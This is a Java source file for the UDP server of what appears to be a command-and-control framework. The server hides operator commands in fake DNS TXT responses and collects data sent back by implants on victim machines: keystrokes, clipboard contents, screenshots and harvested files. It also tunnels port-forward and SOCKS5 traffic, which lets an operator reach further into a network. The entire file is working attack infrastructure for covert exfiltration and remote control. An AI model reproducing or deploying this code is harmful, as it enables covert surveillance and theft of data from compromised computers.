package c2.udp;

import java.io.File;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketTimeoutException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.concurrent.CountDownLatch;

import c2.C2Interface;
import c2.Constants;
import c2.HarvestProcessor;
import c2.KeyloggerProcessor;
import c2.crypto.AESEncryptor;
import c2.crypto.Encryptor;
import c2.crypto.NullEncryptor;
import c2.file.ScreenshotHelper;
import c2.session.IOManager;
import c2.session.Session;
import c2.session.filereceiver.FileReceiverDatagramHandler;

public class DNSEmulatorSubdomainComms extends C2Interface {
	public static final String DIRECTORY_HARVEST_TAG = "<dir_harv>";
	public static final String DIRECTORY_HARVEST_BREAK_TAG = "<hv>";
	
	private int port;
	private IOManager io;
	private Properties properties;

	private boolean running = true;
	private CountDownLatch deathLatch = new CountDownLatch(1);
	private CountDownLatch startLatch = new CountDownLatch(1);

	private String screenshotBuffer = "";

	private final int UNKNOWN_SESSION = 0;
	//TODO: Eliminte this, and cache the PID from the original transmission in the Session.
	private final int PLACEHOLDER_PID = 9999;

	private Encryptor encryptor;

	public static final int LEADING_HEADER_DATA = 12;
	public static final int TRAILING_DNS_INFO = 4;

	public String getName() {
		return "DNS Emulator - Subdomain Comms";
	}

	private KeyloggerProcessor keylogger;
	private HarvestProcessor harvester;
	private FileReceiverDatagramHandler fileReceiverProcessor;

	public void initialize(IOManager io, Properties prop, KeyloggerProcessor keylogger, HarvestProcessor harvester) {
		this.properties = prop;
		this.port = Integer.parseInt(properties.getProperty(Constants.DNSPORT));
		this.io = io;

		encryptor = new NullEncryptor();
		if (Boolean.parseBoolean(properties.getProperty(Constants.WIREENCRYPTTOGGLE))) {
			System.out.println("Initializing with AES");
			byte[] key = Base64.getDecoder().decode(properties.getProperty(Constants.WIREENCRYPTKEY));
			encryptor = new AESEncryptor(key);
		}

		this.keylogger = keylogger;
		this.harvester = harvester;
		fileReceiverProcessor = new FileReceiverDatagramHandler(Paths.get(prop.getProperty(Constants.DAEMON_EXFILTEST_DIRECTORY)));
	}

	@Override
	public void notifyPendingShutdown() {
		running = false;
	}

	public void stop() {
		running = false;
		try {
			deathLatch.await();
		} catch (InterruptedException e) {
			// Ignore
		}
	}

	public String extractB64Payload(byte[] packet, int usedLength) {
		int contentLen = packet[LEADING_HEADER_DATA];
		return new String(packet, LEADING_HEADER_DATA + 1, contentLen);
	}

	public static boolean hasExistingSessionUID(byte[] packet) {
		try {
			getExistingSessionUID(packet);
			return true;
		} catch (IllegalArgumentException ex) {
			return false;
		}
	}

	public static byte[] getBytesFromShort(short data) {
		byte[] retVal = new byte[2];
		retVal[0] = (byte) (data & 0xff);
		retVal[1] = (byte) ((data >> 8) & 0xff);
		return retVal;
	}

	public static int getExistingSessionUID(byte[] packet) {
		byte first = packet[8];
		byte second = packet[9];
		if (first == 0 && second == 0) {
			throw new IllegalArgumentException("Packet does not have an exisitng UID");
		}
		short val = (short) (((first & 0xFF) << 8) | (second & 0xFF));// Assumes first byte is high value
		return val;
	}

	public static boolean isLastInSequence(byte[] packet) {
		if (packet.length < (LEADING_HEADER_DATA + 2 + 1 + TRAILING_DNS_INFO)) {
			throw new IllegalArgumentException("This is not a valid packet");
		}
		// Additional RR flag is set for terminated packet
		if (packet[11] == 0x01) {
			return true;
		} else {
			return false;
		}
	}

	public void awaitStartup() {
		try {
			startLatch.await();
		} catch (InterruptedException e) {

		}
	}

	@Override
	public void run() {
		try {
			byte[] buf = new byte[2000000];
			DatagramSocket socket = new DatagramSocket(port);
			socket.setSoTimeout(500);
			System.out.println("DNS online: " + port);
			StringBuilder sb = new StringBuilder();
			startLatch.countDown();
			Map<Integer, StringBuilder> incompleteTransmissions = new HashMap<>();
			while (running) {
				try {
					Arrays.fill(buf, (byte) 0);
					DatagramPacket packet = new DatagramPacket(buf, buf.length);
					socket.receive(packet);

					// First byte of string is not content-bearing ASCII. Use as the stop flag
					// End of string is null terminator. Java doesn't need it.
					String data = extractB64Payload(packet.getData(), packet.getLength());
					if (Constants.DEBUG) {
						System.out.println("DEBUG: UDP received raw: " + data);
					}

					int sessionKey = UNKNOWN_SESSION;

					boolean isLastPacket = false;
					try {
						isLastPacket = isLastInSequence(packet.getData());
					} catch (IllegalArgumentException ex) {
						continue;// Packet is malformed
					}

					if (!hasExistingSessionUID(packet.getData())) {
						// The initial request for session should never need to span packets. But just
						// in case, we throw
						// some future-proofing in there
						sb.append(data);
						if (isLastPacket) {
							data = sb.toString();
							sb = new StringBuilder();
						} else {
							continue;
						}
					} else {
						sessionKey = getExistingSessionUID(packet.getData());
						if (!incompleteTransmissions.containsKey(sessionKey)) {
							incompleteTransmissions.put(sessionKey, new StringBuilder());
						}
						incompleteTransmissions.get(sessionKey).append(data);
						if (isLastPacket) {
							data = incompleteTransmissions.get(sessionKey).toString();
							incompleteTransmissions.put(sessionKey, new StringBuilder());
						} else {
							continue;
						}
					}

					try {
						data = encryptor.decrypt(data);
					} catch (IllegalArgumentException ex) {
						// Sometimes we get a malformed message. Discard and move on
						continue;
					}
					// Ignore bad data
					if (data == null) {
						continue;
					}

					String[] args = data.split("<spl>");
					String response;
					if (args.length != 5 && args.length != 6 && sessionKey == UNKNOWN_SESSION) {
						response = "Invalid message";
					} else {
						Integer sessionId = sessionKey;
						String message = null;
						String hostname = null;
						String username = null;
						String pid = PLACEHOLDER_PID + "";
						if (sessionKey == UNKNOWN_SESSION) {
							hostname = args[0];
							username = args[1];
							pid = args[2];
							String protocol = args[3];

							String daemonUID = null;
							if (args.length == 5) {
								message = args[4];
							} else {// Is 6
								daemonUID = args[4];
								message = args[5];
							}
							sessionId = io.determineAndGetCorrectSessionId(hostname, username, protocol, daemonUID);
						} else {
							Session thisSession = io.getSession(sessionKey);
							if(thisSession == null) {
								continue;//Someone spamming, ignore and continue
							}else {
								message = data;
								hostname = thisSession.hostname;
								username = thisSession.username;
							}
						}
						io.updateSessionContactTime(sessionId);
						if (message.equals("<req-session>")) {
							response = sessionId + "";
						}else if(message.startsWith(DIRECTORY_HARVEST_TAG)) {
							String[] harvestElements = message.substring(DIRECTORY_HARVEST_TAG.length()).split(DIRECTORY_HARVEST_BREAK_TAG);
							if (harvestElements.length != 2) {
								response = "Invalid request";
							} else {
								try {
									int harvestSession = Integer.parseInt(harvestElements[0]);
									if(!fileReceiverProcessor.hasSessionCurrently(sessionId, harvestSession)) {
										fileReceiverProcessor.registerNewSession(sessionId, harvestSession, hostname);
									}
									byte[] harvestData = Base64.getDecoder().decode(harvestElements[1]);
									fileReceiverProcessor.processIncoming(sessionId, harvestSession, harvestData);
									response = "accepted";
								}catch(IllegalArgumentException ex)
								{
									response = "Invalid request";
								}
							}
						} else if (message.startsWith("<portForward>")) {
							String[] pfRequest = message.substring("<portForward>".length()).split("<pf>");
							if (pfRequest.length != 2) {
								response = "Invalid request";
							} else {
								try {
									if (!pfRequest[1].equals("<REQUEST_DATA>")) {
										io.queueForwardedTCPTraffic(sessionId, pfRequest[0], pfRequest[1]);
									}
									// System.out.println("Request Data: " + pfRequest[0] + " at " + sessionId);
									String nextData = io.grabForwardedTCPTraffic(sessionId, pfRequest[0]);
									if (nextData != null) {
										response = nextData;
									} else {
										response = Constants.PORT_FORWARD_NO_DATA;
									}
								} catch (IllegalArgumentException ex) {
									response = "Invalid request";
								}
							}
						} else if (message.startsWith("<socks5>")) {
							//TODO: Consolidate code with above portForward functionality
							String[] pfRequest = message.substring("<socks5>".length()).split("<pf>");
							if (pfRequest.length != 2) {
								response = "Invalid request";
							} else {
								try {
									int socksId = Integer.parseInt(pfRequest[0]);
									String forwardID = "socksproxy:" + socksId;
									if (!pfRequest[1].equals("<REQUEST_DATA>")) {
										io.queueForwardedTCPTraffic(sessionId, forwardID, pfRequest[1]);
									}
									// System.out.println("Request Data: " + pfRequest[0] + " at " + sessionId);
									String nextData = io.grabForwardedTCPTraffic(sessionId, forwardID);
									if (nextData != null) {
										response = nextData;
									} else {
										response = Constants.PORT_FORWARD_NO_DATA;
									}
								} catch (IllegalArgumentException ex) {
									response = "Invalid request";
								}
							}
						} else {
							String nextCommand = io.pollCommand(sessionId);
							if (Constants.DEBUG) {
								System.out.println(
										"DEBUG: UDP polling for command for: " + sessionId + ": " + nextCommand);
							}
							if (nextCommand != null) {
								response = nextCommand;
							} else {
								response = "<control> No Command";
							}
							if (message.startsWith("<harvest>")) {
								String baseDir = properties.getProperty(Constants.DAEMONLZHARVEST) + File.separator
										+ hostname + pid + username;
								Files.createDirectories(Paths.get(baseDir));
								String file = "";
								if (message.contains("<Clipboard>")) {
									file = message.substring("<harvest><Clipboard>".length());
									harvester.processHarvest("Clipboard", hostname, pid, username, file);
								} else {
									// TODO: Implement DNS generic harvest reception
								}

								if (Constants.DEBUG) {
									System.out.println("DEBUG: UDP harvest payload: " + file);
								}
							} else if (message.startsWith("<keylogger>")) {
								keylogger.writeEntry(hostname, message.substring("<keylogger>".length()));
							//TODO: This screenshot implementation is based on the original logic which divided screenshot
							//transmissions. Now transmission division is done automatically, so leverage
							//that to more efficiently divide only once. This should save 10% on screenshot send time
							} else if (message.startsWith("<screenshot>") && !message.contains("<final>")) {
								String b64 = message.substring("<screenshot>".length());
								screenshotBuffer = screenshotBuffer + b64;
								// If we tell the client a normal "no command", it will be queued.
								// Give special discard statement that can be ignored.
								response = "<discard>";
							} else if (message.startsWith("<screenshot>") && message.contains("<final>")) {
								String b64 = message.substring("<screenshot><final>".length());
								ScreenshotHelper.saveScreenshot(screenshotBuffer + b64, hostname, username,
										properties.getProperty(Constants.DAEMONLZHARVEST));
								screenshotBuffer = "";
							} else if (!message.contentEquals("<poll>")) {
								if(!message.endsWith(Constants.NEWLINE)) {
									message = message + System.lineSeparator();
								}
								io.sendIO(sessionId, message);
							}
						}
					}

					if (Constants.DEBUG) {
						System.out.println("DEBUG: UDP sending payload: " + response);
					}
					byte[] responsePayload = buildResponsePayload(response, extractDomainFromRequest(buf),
							extractDNSIdFromRequest(buf));

					InetAddress rspAddress = packet.getAddress();
					int respPort = packet.getPort();
					packet = new DatagramPacket(responsePayload, responsePayload.length, rspAddress, respPort);
					socket.send(packet);
				} catch (SocketTimeoutException ex) {
					// Continue
				}
			}
			socket.close();
		} catch (IOException e) {
			System.out.println("Unable to bind to socket: " + e.getMessage());
		}
		deathLatch.countDown();
	}

	public String extractDomainFromRequest(byte[] request) {
		int startIdx = 12;
		int currentIdx = startIdx;
		// First element discard
		StringBuilder sb = new StringBuilder();
		currentIdx = currentIdx + request[currentIdx];
		sb.append(new String(request, startIdx + 1, currentIdx - startIdx));
		currentIdx++;
		while (request[currentIdx] != '\00') {
			startIdx = currentIdx + 1;
			currentIdx = startIdx + request[currentIdx];
			sb.append(".");
			sb.append(new String(request, startIdx, currentIdx - startIdx));
		}
		return sb.toString();
	}

	public byte[] extractDNSIdFromRequest(byte[] request) {
		byte[] id = new byte[2];
		id[0] = request[0];
		id[1] = request[1];
		return id;
	}

	public byte[] buildResponsePayload(String message, String originalDomain, byte[] dnsIs) {
		// Make sure to randomize the number of answers
		List<Byte> packetBytes = new ArrayList<>();

		String messageEnc = encryptor.encrypt(message);

		for (int idx = 0; idx < dnsIs.length; idx++) {
			packetBytes.add(dnsIs[idx]);
		}
		packetBytes.add((byte) 0x81);// Response code
		packetBytes.add((byte) 0x80);
		packetBytes.add((byte) 0x00);// Queries count
		packetBytes.add((byte) 0x01);
		String domainElements[] = originalDomain.split("\\.");
		for (String element : domainElements) {
			int elementLen = element.length();
			byte elb = (byte) elementLen;
			packetBytes.add(elb);
			byte[] elementBytes = element.getBytes();
			for (int idx = 0; idx < elementBytes.length; idx++) {
				packetBytes.add(elementBytes[idx]);
			}
		}
		packetBytes.add((byte) 0x00);// Trailing null byte

		packetBytes.add((byte) 0xc0);// Response name (https://en.wikipedia.org/wiki/TXT_record)
		packetBytes.add((byte) 0x0c);
		packetBytes.add((byte) 0x00);// Type
		packetBytes.add((byte) 0x10);
		packetBytes.add((byte) 0x00);// Class (TXT)
		packetBytes.add((byte) 0x10);
		packetBytes.add((byte) 0x00);// Data length //TODO: This will show an error for larger (>255) strings.
		packetBytes.add((byte) messageEnc.length());
		packetBytes.add((byte) messageEnc.length());// Text length

		byte[] messageBytes = messageEnc.getBytes();
		for (int idx = 0; idx < messageBytes.length; idx++) {
			packetBytes.add(messageBytes[idx]);
		}

		byte[] packet = new byte[packetBytes.size()];

		for (int jdx = 0; jdx < packetBytes.size(); jdx++) {
			packet[jdx] = packetBytes.get(jdx);
		}

		return packet;
	}

}
